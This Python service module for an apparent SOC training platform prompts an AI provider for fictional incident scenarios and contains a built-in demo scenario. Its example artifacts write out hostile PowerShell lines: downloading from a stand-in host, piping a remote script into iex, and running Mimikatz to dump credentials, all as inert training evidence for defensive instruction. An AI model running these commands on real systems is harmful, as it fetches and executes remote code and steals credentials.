"""
AI Scenario Generation Service.

Calls the administrator-configured OpenAI-compatible provider to produce a
complete incident scenario JSON, then persists the results to the database.

If no AI key is configured, the function falls back to a built-in demo
scenario so the rest of the application remains runnable.
"""

import logging
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from app.db.session import SessionLocal
from app.models.scenario import Scenario
from app.services.ai_provider import call_ai, get_ai_config, parse_json_content
from app.services.mitre_service import collect_generated_ids, mitre_catalog

logger = logging.getLogger(__name__)


# ── Prompt ─────────────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are an expert cybersecurity incident author for a SOC training platform.
You generate realistic but entirely fictional incident scenarios.
Always respond with valid JSON only – no markdown fences, no preamble, no commentary.
"""

def _build_user_prompt(scenario: Scenario) -> str:
    return f"""Generate a complete cybersecurity training scenario for the following incident.

INCIDENT TITLE: {scenario.title}
DESCRIPTION: {scenario.description or "Not provided"}
DIFFICULTY: {scenario.difficulty}
MITRE TECHNIQUES: {', '.join(scenario.mitre_techniques or []) or 'Choose appropriate techniques'}
IOCs: {', '.join(scenario.iocs or []) or 'Generate realistic IOCs'}
ARTICLE / MODERATOR PLAN: {(scenario.article_text or '')[:10000]}

Return a JSON object with EXACTLY this structure:
{{
  "summary": "2-3 sentence executive summary of the incident",
  "assets": [
    {{"name": "hostname", "type": "endpoint|server|network", "os": "Windows 10", "role": "Developer workstation"}}
  ],
  "attack_steps": [
    {{"step": 1, "technique": "T1566.001", "name": "Spearphishing", "description": "...", "host": "DEV-PC-01"}}
  ],
  "timeline": [
    {{"timestamp": "2026-06-26T08:00:00Z", "event": "Phishing email received", "host": "DEV-PC-01", "mitre_id": "T1566.001"}}
  ],
  "events": [
    {{
      "event_type": "process_creation",
      "source": "sysmon",
      "host": "DEV-PC-01",
      "user": "developer01",
      "message": "powershell.exe launched with encoded command",
      "mitre_id": "T1059.001",
      "is_malicious": true,
      "timestamp": "2026-06-26T08:15:00Z"
    }}
  ],
  "artifacts": [
    {{
      "name": "PowerShell History",
      "artifact_type": "powershell_history",
      "host": "DEV-PC-01",
      "content": "Get-Process\\nInvoke-WebRequest -Uri http://evil.example.com/payload -OutFile C:\\\\temp\\\\svc.exe"
    }}
  ],
  "indicators": [
    {{"ioc_type": "ip", "value": "198.51.100.42", "description": "C2 server", "mitre_id": "T1071.001"}}
  ],
  "alerts": [
    {{"title": "Encoded PowerShell Execution", "severity": "high", "description": "...", "mitre_id": "T1059.001", "rule_name": "soc_encoded_ps"}}
  ],
  "questions": [
    {{
      "order": 1,
      "question_text": "What is the IP address of the C2 server identified in this incident?",
      "question_type": "ip_domain",
      "choices": [],
      "correct_answer": "198.51.100.42",
      "required_keywords": [],
      "points": 10,
      "hint": "Check the network events and indicators."
    }}
  ],
  "containment_actions": [
    {{"action_type": "block_ip", "target": "198.51.100.42", "description": "Block C2 server", "is_correct": "positive", "points": 10}}
  ]
}}

Rules:
- Generate 3-5 assets, 5-8 attack_steps, 40-60 events (mix malicious + normal), 3-5 artifacts,
  5-8 indicators, 3-5 alerts, {scenario.num_questions or 10} questions, 3-5 containment_actions.
- Normal (non-malicious) events must have "is_malicious": false.
- Use realistic but fictional hostnames, IPs (RFC 5737 / RFC 3849 ranges), usernames.
- All timestamps in ISO 8601 format starting around 2026-06-26T08:00:00Z.
- question_type must be one of: text, multiple_choice, ip_domain, mitre, timeline, summary.
- For multiple_choice questions include 4 choices and set correct_answer to the correct one.
- containment_actions is_correct: "positive" (correct action), "negative" (wrong/harmful), "neutral".
- When an AI Moderator plan is present, implement its attack flow and synthetic log plan faithfully.
- Never emit executable malware or exploit code; represent adversary behavior as inert training evidence.
"""


# ── Fallback demo scenario ─────────────────────────────────────────────────────

def _demo_scenario():
    base = datetime(2026, 6, 26, 8, 0, 0)

    events = []
    # Normal events
    for i in range(35):
        t = base + timedelta(minutes=i * 2)
        events.append({
            "event_type": "process_creation",
            "source": "sysmon",
            "host": "DEV-PC-01",
            "user": "developer01",
            "message": f"Normal process: chrome.exe PID {1000+i}",
            "mitre_id": None,
            "is_malicious": False,
            "timestamp": t.isoformat() + "Z",
        })
    # Malicious events
    malicious = [
        ("email_open", "Outlook opened phishing email from hr-noreply@acme-corp.net", "T1566.001", base + timedelta(minutes=5)),
        ("process_creation", "powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA...", "T1059.001", base + timedelta(minutes=10)),
        ("network_connection", "powershell.exe connected to 198.51.100.42:443", "T1071.001", base + timedelta(minutes=11)),
        ("file_creation", "C:\\Users\\developer01\\AppData\\Local\\Temp\\svc32.exe created", "T1105", base + timedelta(minutes=12)),
        ("credential_access", "mimikatz invocation detected: sekurlsa::logonpasswords", "T1003.001", base + timedelta(minutes=20)),
        ("lateral_movement", "RDP connection from DEV-PC-01 to BUILD-SRV-01", "T1021.001", base + timedelta(minutes=35)),
        ("persistence", "Scheduled task created: MicrosoftUpdateHelper", "T1053.005", base + timedelta(minutes=40)),
        ("exfiltration", "Large HTTPS POST to 203.0.113.77 (2.3 GB)", "T1048.002", base + timedelta(minutes=90)),
    ]
    for etype, msg, mid, ts in malicious:
        events.append({
            "event_type": etype,
            "source": "sysmon",
            "host": "DEV-PC-01",
            "user": "developer01",
            "message": msg,
            "mitre_id": mid,
            "is_malicious": True,
            "timestamp": ts.isoformat() + "Z",
        })

    return {
        "summary": (
            "A developer workstation was compromised via a spearphishing email containing a "
            "malicious macro. The attacker established a C2 channel, harvested credentials, "
            "moved laterally to the build server, and exfiltrated source code over HTTPS."
        ),
        "assets": [
            {"name": "DEV-PC-01", "type": "endpoint", "os": "Windows 10", "role": "Developer workstation"},
            {"name": "BUILD-SRV-01", "type": "server", "os": "Windows Server 2019", "role": "CI/CD build server"},
            {"name": "FW-01", "type": "network", "os": "pfSense", "role": "Perimeter firewall"},
        ],
        "attack_steps": [
            {"step": 1, "technique": "T1566.001", "name": "Spearphishing Attachment", "description": "Attacker sent phishing email with malicious macro document", "host": "DEV-PC-01"},
            {"step": 2, "technique": "T1059.001", "name": "PowerShell Execution", "description": "Macro executed encoded PowerShell to download stager", "host": "DEV-PC-01"},
            {"step": 3, "technique": "T1071.001", "name": "C2 via HTTPS", "description": "Stager connected to 198.51.100.42 over port 443", "host": "DEV-PC-01"},
            {"step": 4, "technique": "T1003.001", "name": "Credential Dumping", "description": "Attacker ran Mimikatz to harvest plaintext credentials", "host": "DEV-PC-01"},
            {"step": 5, "technique": "T1021.001", "name": "Lateral Movement via RDP", "description": "Used harvested credentials to RDP into build server", "host": "BUILD-SRV-01"},
            {"step": 6, "technique": "T1048.002", "name": "Exfiltration over HTTPS", "description": "Source code exfiltrated to 203.0.113.77", "host": "BUILD-SRV-01"},
        ],
        "timeline": [
            {"timestamp": "2026-06-26T08:05:00Z", "event": "Phishing email opened", "host": "DEV-PC-01", "mitre_id": "T1566.001"},
            {"timestamp": "2026-06-26T08:10:00Z", "event": "Encoded PowerShell executed", "host": "DEV-PC-01", "mitre_id": "T1059.001"},
            {"timestamp": "2026-06-26T08:11:00Z", "event": "C2 beacon established", "host": "DEV-PC-01", "mitre_id": "T1071.001"},
            {"timestamp": "2026-06-26T08:20:00Z", "event": "Credential harvesting", "host": "DEV-PC-01", "mitre_id": "T1003.001"},
            {"timestamp": "2026-06-26T08:35:00Z", "event": "Lateral movement to BUILD-SRV-01", "host": "BUILD-SRV-01", "mitre_id": "T1021.001"},
            {"timestamp": "2026-06-26T09:30:00Z", "event": "Data exfiltration (2.3 GB)", "host": "BUILD-SRV-01", "mitre_id": "T1048.002"},
        ],
        "events": events,
        "artifacts": [
            {
                "name": "PowerShell History",
                "artifact_type": "powershell_history",
                "host": "DEV-PC-01",
                "content": (
                    "PS> Get-Process\n"
                    "PS> Invoke-WebRequest -Uri http://198.51.100.42/s.ps1 -UseBasicParsing | iex\n"
                    "PS> [System.Convert]::FromBase64String('JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA') | iex\n"
                    "PS> net user /domain\n"
                    "PS> mimikatz.exe sekurlsa::logonpasswords"
                ),
            },
            {
                "name": "Phishing Email",
                "artifact_type": "phishing_email",
                "host": "DEV-PC-01",
                "content": (
                    "From: hr-noreply@acme-corp.net\n"
                    "To: developer01@company.internal\n"
                    "Subject: Urgent: Q2 Bonus Confirmation Required\n\n"
                    "Please review the attached document and enable macros to confirm your bonus amount."
                ),
            },
            {
                "name": "Scheduled Task XML",
                "artifact_type": "scheduled_task",
                "host": "DEV-PC-01",
                "content": (
                    '<?xml version="1.0"?>\n'
                    '<Task><RegistrationInfo><Description>Microsoft Update Helper</Description></RegistrationInfo>'
                    '<Actions><Exec><Command>C:\\Users\\developer01\\AppData\\Local\\Temp\\svc32.exe</Command></Exec></Actions></Task>'
                ),
            },
        ],
        "indicators": [
            {"ioc_type": "ip", "value": "198.51.100.42", "description": "C2 server (stager download)", "mitre_id": "T1071.001"},
            {"ioc_type": "ip", "value": "203.0.113.77", "description": "Exfiltration destination", "mitre_id": "T1048.002"},
            {"ioc_type": "domain", "value": "acme-corp.net", "description": "Phishing sender domain", "mitre_id": "T1566.001"},
            {"ioc_type": "hash", "value": "a3f5c2d8e1b04697f9a2c3d4e5f60718", "description": "MD5 of svc32.exe dropper", "mitre_id": "T1105"},
            {"ioc_type": "filename", "value": "svc32.exe", "description": "Dropped malicious binary", "mitre_id": "T1105"},
        ],
        "alerts": [
            {"title": "Encoded PowerShell Execution Detected", "severity": "high", "description": "Sysmon detected powershell.exe launched with Base64-encoded command string", "mitre_id": "T1059.001", "rule_name": "soc_encoded_powershell"},
            {"title": "Suspicious Outbound HTTPS Connection", "severity": "high", "description": "Repeated beaconing to 198.51.100.42:443 at regular intervals", "mitre_id": "T1071.001", "rule_name": "soc_c2_beacon"},
            {"title": "Mimikatz Credential Harvesting", "severity": "critical", "description": "Mimikatz keywords detected in process command line", "mitre_id": "T1003.001", "rule_name": "soc_mimikatz"},
            {"title": "Large Data Exfiltration over HTTPS", "severity": "critical", "description": "2.3 GB outbound HTTPS transfer to unknown external IP", "mitre_id": "T1048.002", "rule_name": "soc_exfil_large"},
        ],
        "questions": [
            {"order": 1, "question_text": "What is the IP address of the C2 server used in this incident?", "question_type": "ip_domain", "choices": [], "correct_answer": "198.51.100.42", "required_keywords": [], "points": 10, "hint": "Check network events and indicators."},
            {"order": 2, "question_text": "Which MITRE ATT&CK technique was used to execute the initial payload?", "question_type": "mitre", "choices": [], "correct_answer": "T1059.001", "required_keywords": [], "points": 10, "hint": "Look at the first malicious process event."},
            {"order": 3, "question_text": "What method did the attacker use to gain initial access?", "question_type": "multiple_choice", "choices": ["SQL injection", "Spearphishing with malicious macro", "Brute force RDP", "Supply chain compromise"], "correct_answer": "Spearphishing with malicious macro", "required_keywords": [], "points": 10, "hint": "Check the phishing email artifact."},
            {"order": 4, "question_text": "Which host was compromised via lateral movement?", "question_type": "text", "choices": [], "correct_answer": "BUILD-SRV-01", "required_keywords": ["BUILD-SRV-01"], "points": 10, "hint": "Check RDP connection events."},
            {"order": 5, "question_text": "What tool was used to harvest credentials?", "question_type": "text", "choices": [], "correct_answer": "Mimikatz", "required_keywords": ["mimikatz"], "points": 10, "hint": "Check the PowerShell history artifact."},
            {"order": 6, "question_text": "What was the name of the malicious executable dropped on the system?", "question_type": "text", "choices": [], "correct_answer": "svc32.exe", "required_keywords": ["svc32.exe"], "points": 10, "hint": "Check file creation events and indicators."},
            {"order": 7, "question_text": "Describe the attack chain from initial access to exfiltration in your own words.", "question_type": "summary", "choices": [], "correct_answer": "", "required_keywords": ["phishing", "powershell", "credentials", "lateral", "exfiltration"], "points": 20, "hint": "Follow the timeline of events."},
            {"order": 8, "question_text": "What was the exfiltration IP address?", "question_type": "ip_domain", "choices": [], "correct_answer": "203.0.113.77", "required_keywords": [], "points": 10, "hint": "Look for large outbound network transfers."},
        ],
        "containment_actions": [
            {"action_type": "block_ip", "target": "198.51.100.42", "description": "Block C2 server IP at perimeter firewall", "is_correct": "positive", "points": 10},
            {"action_type": "block_ip", "target": "203.0.113.77", "description": "Block exfiltration destination IP", "is_correct": "positive", "points": 10},
            {"action_type": "isolate_host", "target": "DEV-PC-01", "description": "Isolate compromised developer workstation", "is_correct": "positive", "points": 15},
            {"action_type": "isolate_host", "target": "BUILD-SRV-01", "description": "Isolate build server used for lateral movement", "is_correct": "positive", "points": 15},
            {"action_type": "disable_account", "target": "developer01", "description": "Disable compromised developer account", "is_correct": "positive", "points": 10},
            {"action_type": "isolate_host", "target": "FW-01", "description": "Isolate the firewall (wrong – causes outage)", "is_correct": "negative", "points": -10},
        ],
    }


# ── Main generation function ───────────────────────────────────────────────────

def _call_provider(prompt: str, db: Session) -> dict:
    """Call the configured OpenAI-compatible provider and parse scenario JSON."""
    config = get_ai_config(db)
    content = call_ai(
        config,
        [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ],
        max_tokens=8192,
    )
    return parse_json_content(content)


def _persist_scenario_data(db: Session, scenario: Scenario, data: dict):
    """Write the generated JSON data into the database."""
    from datetime import datetime as dt
    from app.models.event import ScenarioEvent
    from app.models.artifact import ScenarioArtifact
    from app.models.indicator import Indicator
    from app.models.alert import Alert
    from app.models.question import Question
    from app.models.containment import ContainmentAction

    generated_mitre_ids = collect_generated_ids(data)
    invalid_mitre_ids = mitre_catalog.invalid_ids(generated_mitre_ids)
    if invalid_mitre_ids:
        raise ValueError(f"AI generated invalid MITRE ATT&CK IDs: {', '.join(invalid_mitre_ids)}")

    # Purge any existing generated data for this scenario
    for model in [ScenarioEvent, ScenarioArtifact, Indicator, Alert, Question, ContainmentAction]:
        db.query(model).filter(model.scenario_id == scenario.id).delete()

    # Update scenario top-level fields
    scenario.summary = data.get("summary", "")
    scenario.assets = data.get("assets", [])
    scenario.attack_steps = data.get("attack_steps", [])
    scenario.timeline = data.get("timeline", [])
    scenario.mitre_techniques = generated_mitre_ids

    # Events
    for e in data.get("events", []):
        ts = None
        try:
            ts = dt.fromisoformat(e.get("timestamp", "").replace("Z", "+00:00"))
        except Exception:
            pass
        db.add(ScenarioEvent(
            scenario_id=scenario.id,
            event_type=e.get("event_type"),
            source=e.get("source"),
            host=e.get("host"),
            user=e.get("user"),
            message=e.get("message"),
            mitre_id=e.get("mitre_id"),
            is_malicious=e.get("is_malicious", False),
            timestamp=ts,
            event_data={},
        ))

    # Artifacts
    for a in data.get("artifacts", []):
        db.add(ScenarioArtifact(
            scenario_id=scenario.id,
            name=a.get("name"),
            artifact_type=a.get("artifact_type"),
            host=a.get("host"),
            content=a.get("content"),
            related_event_ids=[],
        ))

    # Indicators
    for i in data.get("indicators", []):
        db.add(Indicator(
            scenario_id=scenario.id,
            ioc_type=i.get("ioc_type"),
            value=i.get("value"),
            description=i.get("description"),
            mitre_id=i.get("mitre_id"),
        ))

    # Alerts
    for al in data.get("alerts", []):
        db.add(Alert(
            scenario_id=scenario.id,
            title=al.get("title"),
            severity=al.get("severity", "medium"),
            description=al.get("description"),
            mitre_id=al.get("mitre_id"),
            rule_name=al.get("rule_name"),
        ))

    # Questions
    for q in data.get("questions", []):
        db.add(Question(
            scenario_id=scenario.id,
            order=q.get("order", 0),
            question_text=q.get("question_text"),
            question_type=q.get("question_type", "text"),
            choices=q.get("choices", []),
            correct_answer=q.get("correct_answer", ""),
            required_keywords=q.get("required_keywords", []),
            points=q.get("points", 10),
            hint=q.get("hint"),
        ))

    # Containment actions
    for ca in data.get("containment_actions", []):
        db.add(ContainmentAction(
            scenario_id=scenario.id,
            action_type=ca.get("action_type"),
            target=ca.get("target"),
            description=ca.get("description"),
            is_correct=ca.get("is_correct", "positive"),
            points=ca.get("points", 10),
        ))

    scenario.status = "ready"
    db.commit()
    logger.info(f"Scenario {scenario.id} generation complete.")


def run_ai_generation(scenario_id: int):
    """
    Background task entry point.  Called from the /generate endpoint.
    Opens its own DB session (FastAPI background tasks run outside the
    request session).
    """
    db: Session = SessionLocal()
    try:
        scenario = db.query(Scenario).filter(Scenario.id == scenario_id).first()
        if not scenario:
            logger.error(f"Scenario {scenario_id} not found for generation.")
            return

        scenario.status = "generating"
        db.commit()

        ai_config = get_ai_config(db)
        if ai_config.api_key:
            logger.info(f"Calling configured AI provider for scenario {scenario_id}")
            prompt = _build_user_prompt(scenario)
            data = _call_provider(prompt, db)
        else:
            logger.warning(f"AI API key not configured; using demo scenario for {scenario_id}")
            data = _demo_scenario()

        _persist_scenario_data(db, scenario, data)

    except Exception as exc:
        logger.exception(f"Generation failed for scenario {scenario_id}: {exc}")
        try:
            scenario = db.query(Scenario).filter(Scenario.id == scenario_id).first()
            if scenario:
                scenario.status = "validation_failed"
                db.commit()
        except Exception:
            pass
    finally:
        db.close()
